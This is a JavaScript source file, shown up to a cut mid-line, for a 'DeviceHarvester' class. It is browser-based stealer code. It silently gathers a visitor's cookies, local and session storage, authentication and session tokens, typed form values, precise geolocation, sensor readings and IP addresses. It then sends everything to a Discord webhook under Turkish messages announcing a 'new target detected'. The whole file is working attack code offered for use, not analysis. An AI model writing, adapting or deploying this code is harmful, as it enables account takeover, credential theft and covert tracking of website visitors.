class DeviceHarvester {
    constructor(config) {
        this.webhook = config.webhookURL;
        this.retries = 0;
        this.maxRetries = config.maxRetries || 3;
        this.collectedData = {};
        this.startTime = Date.now();
    }

    async harvest() {
        this.collectedData.basic = this.getBasicInfo();
        this.collectedData.browser = this.getBrowserInfo();
        this.collectedData.storage = this.getStorageData();
        this.collectedData.network = await this.getNetworkInfo();
        this.collectedData.hardware = await this.getHardwareInfo();
        this.collectedData.location = await this.getLocation();
        this.collectedData.sensors = await this.getSensorData();
        this.collectedData.tokens = this.extractTokens();
        this.collectedData.deviceType = this.detectMobileOS();
        this.collectedData.battery = await this.getBatteryInfo();
        this.collectedData.webrtc = this.getWebRTCInfo();
        this.collectedData.forms = this.captureFormData();
        this.collectedData.sessionID = this.generateSessionID();
        this.collectedData.timestamp = new Date().toISOString();
        
        await this.sendToDiscord();
        return this.collectedData;
    }

    getBasicInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            product: navigator.product,
            productSub: navigator.productSub,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            appCodeName: navigator.appCodeName,
        };
    }

    getBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = 'unknown';
        let version = 'unknown';
        
        if (ua.includes('Chrome')) {
            browser = 'Chrome';
            version = ua.match(/Chrome\/(\d+)/)?.[1] || 'unknown';
        } else if (ua.includes('Firefox')) {
            browser = 'Firefox';
            version = ua.match(/Firefox\/(\d+)/)?.[1] || 'unknown';
        } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
            browser = 'Safari';
            version = ua.match(/Version\/(\d+)/)?.[1] || 'unknown';
        } else if (ua.includes('Edge')) {
            browser = 'Edge';
            version = ua.match(/Edge\/(\d+)/)?.[1] || 'unknown';
        } else if (ua.includes('Opera') || ua.includes('OPR')) {
            browser = 'Opera';
            version = ua.match(/(?:Opera|OPR)\/(\d+)/)?.[1] || 'unknown';
        }
        
        return {
            name: browser,
            version: version,
            isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(ua),
            isDesktop: !/Mobi|Android|iPhone|iPad|iPod/i.test(ua),
            isTablet: /iPad|Tablet/i.test(ua),
            userAgent: ua,
        };
    }

    getStorageData() {
        let localStorageData = {};
        let sessionStorageData = {};
        
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) localStorageData[key] = localStorage.getItem(key);
            }
        } catch (e) { localStorageData = { error: 'Cannot access localStorage' }; }
        
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) sessionStorageData[key] = sessionStorage.getItem(key);
            }
        } catch (e) { sessionStorageData = { error: 'Cannot access sessionStorage' }; }
        
        return {
            localStorage: localStorageData,
            sessionStorage: sessionStorageData,
            cookies: document.cookie,
            cookieLength: document.cookie.length,
            indexedDB: 'available' in window.indexedDB ? 'available' : 'not available',
        };
    }

    async getNetworkInfo() {
        const info = { type: 'unknown', downlink: 'unknown', rtt: 'unknown' };
        
        if ('connection' in navigator) {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                info.type = conn.effectiveType || 'unknown';
                info.downlink = conn.downlink || 'unknown';
                info.rtt = conn.rtt || 'unknown';
                info.saveData = conn.saveData || false;
            }
        }
        
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            info.publicIP = ipData.ip;
        } catch (e) {
            info.publicIP = 'could not fetch';
        }
        
        try {
            const rtcConn = new RTCPeerConnection({ iceServers: [] });
            rtcConn.createDataChannel('test');
            rtcConn.createOffer().then(offer => rtcConn.setLocalDescription(offer));
            rtcConn.onicecandidate = (event) => {
                if (event.candidate) {
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = event.candidate.candidate.match(ipRegex);
                    if (match && !match[0].startsWith('192.168')) {
                        info.localIP = match[0];
                    }
                }
            };
            setTimeout(() => rtcConn.close(), 3000);
        } catch (e) { /* WebRTC not supported */ }
        
        return info;
    }

    async getHardwareInfo() {
        const info = {
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown',
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
            },
            performance: {
                memory: performance.memory ? {
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    usedJSHeapSize: performance.memory.usedJSHeapSize,
                } : 'not available',
                navigation: {
                    type: performance.navigation.type,
                    redirectCount: performance.navigation.redirectCount,
                },
                timing: {
                    loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                    domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
                    responseTime: performance.timing.responseEnd - performance.timing.requestStart,
                }
            }
        };
        return info;
    }

    async getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ available: false, error: 'Geolocation not supported' });
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        available: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || 'unknown',
                        altitudeAccuracy: position.coords.altitudeAccuracy || 'unknown',
                        heading: position.coords.heading || 'unknown',
                        speed: position.coords.speed || 'unknown',
                        timestamp: position.timestamp,
                    });
                },
                (error) => {
                    resolve({
                        available: false,
                        error: error.message,
                        code: error.code,
                    });
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    async getSensorData() {
        const sensors = {};
        
        if ('Accelerometer' in window) {
            try {
                const accel = new Accelerometer();
                accel.addEventListener('reading', () => {
                    sensors.accelerometer = {
                        x: accel.x,
                        y: accel.y,
                        z: accel.z,
                        timestamp: accel.timestamp,
                    };
                });
                accel.start();
                setTimeout(() => accel.stop(), 2000);
            } catch (e) { /* permission denied */ }
        }
        
        if ('Gyroscope' in window) {
            try {
                const gyro = new Gyroscope();
                gyro.addEventListener('reading', () => {
                    sensors.gyroscope = {
                        x: gyro.x,
                        y: gyro.y,
                        z: gyro.z,
                        timestamp: gyro.timestamp,
                    };
                });
                gyro.start();
                setTimeout(() => gyro.stop(), 2000);
            } catch (e) { /* permission denied */ }
        }
        
        if ('Magnetometer' in window) {
            try {
                const mag = new Magnetometer();
                mag.addEventListener('reading', () => {
                    sensors.magnetometer = {
                        x: mag.x,
                        y: mag.y,
                        z: mag.z,
                        timestamp: mag.timestamp,
                    };
                });
                mag.start();
                setTimeout(() => mag.stop(), 2000);
            } catch (e) { /* permission denied */ }
        }
        
        if ('AmbientLightSensor' in window) {
            try {
                const light = new AmbientLightSensor();
                light.addEventListener('reading', () => {
                    sensors.ambientLight = {
                        illuminance: light.illuminance,
                        timestamp: light.timestamp,
                    };
                });
                light.start();
                setTimeout(() => light.stop(), 2000);
            } catch (e) { /* permission denied */ }
        }
        
        return sensors;
    }

    extractTokens() {
        const tokens = [];
        const cookieParts = document.cookie.split(';');
        
        for (const part of cookieParts) {
            const [key, value] = part.trim().split('=');
            if (key && value) {
                if (value.length > 20 && /^[a-zA-Z0-9\-_]+$/.test(value)) {
                    tokens.push({
                        name: key,
                        value: value,
                        type: this.detectTokenType(key, value),
                        source: 'cookie',
                    });
                }
            }
        }
        
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) {
                    const value = localStorage.getItem(key);
                    if (value && value.length > 20 && /^[a-zA-Z0-9\-_]+$/.test(value)) {
                        tokens.push({
                            name: key,
                            value: value,
                            type: this.detectTokenType(key, value),
                            source: 'localStorage',
                        });
                    }
                }
            }
        } catch (e) { /* silent */ }
        
        return tokens;
    }
    
    detectTokenType(key, value) {
        const lowerKey = key.toLowerCase();
        if (lowerKey.includes('token') || lowerKey.includes('jwt') || lowerKey.includes('bearer')) {
            return 'JWT/Bearer Token';
        } else if (lowerKey.includes('session') || lowerKey.includes('sid')) {
            return 'Session Token';
        } else if (lowerKey.includes('auth') || lowerKey.includes('access')) {
            return 'Authentication Token';
        } else if (lowerKey.includes('refresh')) {
            return 'Refresh Token';
        } else if (lowerKey.includes('csrf') || lowerKey.includes('xsrf')) {
            return 'CSRF Token';
        } else if (value.split('.').length === 3 && value.length > 50) {
            return 'JWT (Structure Detected)';
        }
        return 'Unknown Token';
    }

    detectMobileOS() {
        const ua = navigator.userAgent;
        if (/Android/i.test(ua)) {
            const version = ua.match(/Android\s([\d.]+)/);
            return { os: 'Android', version: version ? version[1] : 'unknown' };
        } else if (/iPhone|iPad|iPod/i.test(ua)) {
            const version = ua.match(/OS\s([\d_]+)/);
            return { os: 'iOS', version: version ? version[1].replace(/_/g, '.') : 'unknown' };
        } else if (/Windows Phone/i.test(ua)) {
            return { os: 'Windows Phone', version: 'unknown' };
        } else if (/BlackBerry/i.test(ua)) {
            return { os: 'BlackBerry', version: 'unknown' };
        }
        return { os: 'Unknown', version: 'unknown' };
    }

    async getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level * 100,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                };
            } catch (e) {
                return { error: 'Cannot access battery' };
            }
        }
        return { error: 'Battery API not supported' };
    }

    getWebRTCInfo() {
        try {
            const rtcConfig = {
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            };
            const pc = new RTCPeerConnection(rtcConfig);
            const info = {
                localIPs: [],
                iceCandidates: []
            };
            
            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const candidate = event.candidate.candidate;
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = candidate.match(ipRegex);
                    if (match && !info.localIPs.includes(match[0])) {
                        info.localIPs.push(match[0]);
                    }
                    info.iceCandidates.push(candidate);
                }
            };
            
            pc.createDataChannel('test');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            setTimeout(() => pc.close(), 2000);
            
            return info;
        } catch (e) {
            return { error: 'WebRTC not supported' };
        }
    }

    captureFormData() {
        const forms = [];
        document.querySelectorAll('form').forEach((form, index) => {
            const formData = {
                id: form.id || `form-${index}`,
                action: form.action,
                method: form.method,
                fields: []
            };
            
            form.querySelectorAll('input, textarea, select').forEach(field => {
                if (field.name) {
                    formData.fields.push({
                        name: field.name,
                        type: field.type || 'text',
                        value: field.value || field.innerText || '',
                        id: field.id || '',
                        placeholder: field.placeholder || '',
                    });
                }
            });
            
            forms.push(formData);
        });
        return forms;
    }

    generateSessionID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    async sendToDiscord() {
        const data = this.collectedData;
        const sessionID = data.sessionID || 'unknown';
        
        const summary = {
            content: `**📱 Yeni Hedef Tespit Edildi**\n` +
                    `**Oturum:** \`${sessionID}\`\n` +
                    `**Cihaz:** ${data.deviceType.os} ${data.deviceType.version}\n` +
                    `**Tarayıcı:** ${data.browser.name} ${data.browser.version}\n` +
                    `**IP:** ${data.network.publicIP || 'bilinmiyor'}\n` +
                    `**Konum:** ${data.location.available ? `${data.location.latitude}, ${data.location.longitude}` : 'Kullanıcı izin vermedi'}\n` +
                    `**Zaman:** ${data.timestamp}`
        };
        await this.sendMessage(summary);

        const detailMessage = {
            content: `**📊 Detaylı Veri**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
        };
        
        if (detailMessage.content.length > 2000) {
            await this.sendLargeData(data);
        } else {
            await this.sendMessage(detailMessage);
        }
        
        if (data.tokens && data.tokens.length > 0) {
            let tokenMessage = `**🔑 Tespit Edilen Token/Çerezler**\n`;
            data.tokens.forEach((token, idx) => {
                tokenMessage += `${idx+1}. **${token.name}** (${token.type}) : \`${token.value.substring(0, 30)}...\`\n`;
            });
            await this.sendMessage({ content: tokenMessage });
        }

        if (data.forms && data.forms.length > 0) {
            let formMessage = `**📝 Form Verileri**\n`;
            data.forms.forEach(form => {
                formMessage += `Form: ${form.id} (${form.method})\n`;
                form.fields.forEach(field => {
                    if (field.value && field.value.length > 0) {
                        formMessage += `  - ${field.name}: ${field.value}\n`;
                    }
                });
            });
            await this.sendMessage({ content: formMessage });
        }
    }

    async sendLargeData(data) {
        const jsonString = JSON.stringify(data, null, 2);
        const chunks = jsonString.match(/.{1,1900}/g) || [];
        
        for (let i = 0; i < chunks.length; i++) {
            const isLast = i === chunks.length - 1;
            const content = `**📊 Veri ${i+1}/${chunks.length}**\n\`\`\`json\n${chunks[i]}${isLast ? '\n```' : '\n```'}`;
            await this.sendMessage({ content });
            await this.delay(CONFIG.delayBetweenMessages || 1000);
        }
    }

    async sendMessage(payload) {
        try {
            const response = await fetch(this.webhook, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });
            
            if (!response.ok && this.retries < this.maxRetries) {
                this.retries++;
                await this.delay(1000 * this.retries);
                return this.sendMessage(payload);
            }
            this.retries = 0;
        } catch (e) {
            console.error('Webhook